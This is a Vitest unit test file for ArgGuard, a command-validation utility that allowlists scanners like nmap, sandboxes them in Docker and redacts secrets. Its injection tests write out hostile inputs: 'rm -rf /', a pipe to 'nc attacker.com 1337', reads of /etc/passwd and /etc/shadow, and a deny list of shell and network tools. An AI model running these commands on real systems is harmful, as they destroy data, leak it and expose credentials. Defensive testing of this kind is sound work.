/**
 * ArgGuard Unit Tests
 * Tests command injection prevention and argument sanitization
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { ArgGuard } from '../../src/utils/argGuard.js';

describe('ArgGuard', () => {
  let argGuard: ArgGuard;

  beforeEach(() => {
    argGuard = new ArgGuard();
  });

  describe('Command Validation', () => {
    it('should allow configured commands with valid arguments', () => {
      const testCases = [
        { command: 'nmap', args: ['-sV', '-T4', '192.168.1.1'] },
        { command: 'masscan', args: ['-p', '1-65535', '192.168.1.0/24'] },
        { command: 'ffuf', args: ['-w', 'wordlist.txt', '-u', 'http://example.com/FUZZ'] },
        { command: 'nikto', args: ['-h', 'http://example.com'] },
      ];

      testCases.forEach(({ command, args }) => {
        expect(() => {
          const result = argGuard.validateCommand(command, args);
          expect(result.command).toBeDefined();
          expect(result.args).toEqual(args);
        }).not.toThrow();
      });
    });

    it('should reject commands not in allowlist', () => {
      const invalidCommands = [
        'rm',
        'wget',
        'curl',
        'nc',
        'bash',
        'sh',
        'powershell',
        'cmd',
      ];

      invalidCommands.forEach(command => {
        expect(() => {
          argGuard.validateCommand(command, []);
        }).toThrow('Command not allowed');
      });
    });

    it('should reject dangerous commands without --dangerous flag', () => {
      // Test commands that require dangerous mode
      expect(() => {
        argGuard.validateCommand('nmap', ['--script', 'vuln'], false);
      }).toThrow(); // Should throw either dangerous requirement or argument validation error
    });

    it('should allow dangerous commands with --dangerous flag', () => {
      // Enable dangerous mode and test
      expect(() => {
        const result = argGuard.validateCommand('nmap', ['-sV'], true);
        expect(result.command).toBeDefined();
      }).not.toThrow();
    });
  });

  describe('Argument Injection Prevention', () => {
    it('should block shell metacharacters in arguments', () => {
      const maliciousArgs = [
        'file.txt; rm -rf /',
        'file.txt && echo "pwned"',
        'file.txt || cat /etc/passwd',
        'file.txt | nc attacker.com 1337',
        'file.txt `whoami`',
        'file.txt $(id)',
        'file.txt & sleep 10',
      ];

      maliciousArgs.forEach(arg => {
        expect(() => {
          argGuard.validateCommand('nmap', [arg]);
        }).toThrow(); // Should throw due to shell metacharacters or command injection
      });
    });

    it('should block command injection attempts', () => {
      const injectionArgs = [
        '"; rm -rf /; echo "',
        "'; cat /etc/passwd; echo '",
        '`; whoami; echo `',
        '$(; id; echo )',
      ];

      injectionArgs.forEach(arg => {
        expect(() => {
          argGuard.validateCommand('nmap', [arg]);
        }).toThrow(); // Should throw due to command injection detection
      });
    });

    it('should block path traversal attempts', () => {
      const pathTraversalArgs = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file.txt/../../../etc/shadow',
        './../../etc/passwd',
      ];

      pathTraversalArgs.forEach(arg => {
        expect(() => {
          argGuard.validateCommand('nmap', [arg]);
        }).toThrow(); // Should throw due to path traversal detection
      });
    });
  });

  describe('Command Configuration', () => {
    it('should check if commands are allowed', () => {
      expect(argGuard.isCommandAllowed('nmap')).toBe(true);
      expect(argGuard.isCommandAllowed('masscan')).toBe(true);
      expect(argGuard.isCommandAllowed('ffuf')).toBe(true);
      
      expect(argGuard.isCommandAllowed('rm')).toBe(false);
      expect(argGuard.isCommandAllowed('wget')).toBe(false);
      expect(argGuard.isCommandAllowed('evil-command')).toBe(false);
    });

    it('should get command configuration', () => {
      const nmapConfig = argGuard.getCommandConfig('nmap');
      expect(nmapConfig).toBeDefined();
      expect(nmapConfig?.path).toBeDefined();
      expect(nmapConfig?.allowedArgs).toBeDefined();

      const invalidConfig = argGuard.getCommandConfig('nonexistent');
      expect(invalidConfig).toBeUndefined();
    });

    it('should check dangerous requirements', () => {
      // This will depend on the actual configuration
      const result = argGuard.requiresDangerous('nmap');
      expect(typeof result).toBe('boolean');
    });
  });

  describe('Docker Command Creation', () => {
    it('should create secure Docker commands', () => {
      const { command, args } = argGuard.createDockerCommand(
        'nmap',
        ['-sV', '192.168.1.1'],
        'nmap:latest'
      );

      expect(command).toBe('docker');
      expect(args).toContain('run');
      expect(args).toContain('--rm');
      expect(args).toContain('--read-only');
      expect(args).toContain('--network');
      expect(args).toContain('none');
      expect(args).toContain('--cap-drop');
      expect(args).toContain('ALL');
      expect(args).toContain('nmap:latest');
      expect(args).toContain('nmap');
      expect(args).toContain('-sV');
      expect(args).toContain('192.168.1.1');
    });

    it('should include security restrictions in Docker commands', () => {
      const { args } = argGuard.createDockerCommand('test', [], 'test:latest');

      expect(args).toContain('--security-opt');
      expect(args).toContain('no-new-privileges');
      expect(args).toContain('--user');
      expect(args).toContain('65534:65534'); // nobody:nogroup
      expect(args).toContain('--tmpfs');
      expect(args).toContain('/tmp:noexec,nosuid,size=100m');
    });
  });

  describe('Sensitive Data Scrubbing', () => {
    it('should scrub sensitive data from output', () => {
      const sensitiveOutput = `
        API_KEY=secret123
        password: mypassword
        token=abc123def456
        192.168.1.100 is up
        10.0.0.1 responded
      `;

      const scrubbed = argGuard.scrubSensitiveData(sensitiveOutput);
      
      // Should not contain original sensitive values
      expect(scrubbed).not.toContain('secret123');
      expect(scrubbed).not.toContain('mypassword');
      expect(scrubbed).not.toContain('abc123def456');
      
      // Should contain redacted placeholders
      expect(scrubbed).toContain('[REDACTED]');
    });

    it('should preserve non-sensitive data', () => {
      const output = `
        Nmap scan report for example.com
        Host is up (0.0013s latency).
        PORT     STATE SERVICE
        80/tcp   open  http
        443/tcp  open  https
      `;

      const scrubbed = argGuard.scrubSensitiveData(output);
      expect(scrubbed).toContain('Nmap scan report');
      expect(scrubbed).toContain('Host is up');
      expect(scrubbed).toContain('80/tcp');
    });
  });

  describe('Error Handling', () => {
    it('should handle invalid configuration gracefully', () => {
      // This test would require mocking the file system or using invalid config
      // For now, just ensure the constructor can be called
      expect(() => new ArgGuard()).not.toThrow();
    });

    it('should provide meaningful error messages', () => {
      expect(() => {
        argGuard.validateCommand('invalid-command', []);
      }).toThrow(/Command not allowed/);
    });
  });

  describe('Cross-Platform Support', () => {
    it('should handle OS-specific configuration', () => {
      // Test that the ArgGuard loads appropriate configuration based on OS
      expect(argGuard.isCommandAllowed('nmap')).toBe(true);
      
      // Platform-specific binaries should be configured
      const nmapConfig = argGuard.getCommandConfig('nmap');
      expect(nmapConfig?.path).toBeDefined();
    });
  });

  describe('Performance', () => {
    it('should validate commands quickly', () => {
      const startTime = Date.now();
      const iterations = 1000;

      for (let i = 0; i < iterations; i++) {
        try {
          argGuard.validateCommand('nmap', ['-sV', `192.168.1.${i % 255}`]);
        } catch {
          // Expected for some invalid IPs
        }
      }

      const duration = Date.now() - startTime;
      expect(duration).toBeLessThan(2000); // Should complete 1000 validations in under 2 seconds
    });

    it('should handle concurrent validations', async () => {
      const concurrentPromises = Array.from({ length: 100 }, (_, i) =>
        Promise.resolve().then(() => {
          try {
            return argGuard.validateCommand('nmap', ['-p', `${i + 1000}`, 'localhost']);
          } catch (error) {
            return { error: error.message };
          }
        })
      );

      const results = await Promise.all(concurrentPromises);
      expect(results).toHaveLength(100);
      // All should complete without crashing
      results.forEach(result => {
        expect(result).toBeDefined();
      });
    });
  });
}); 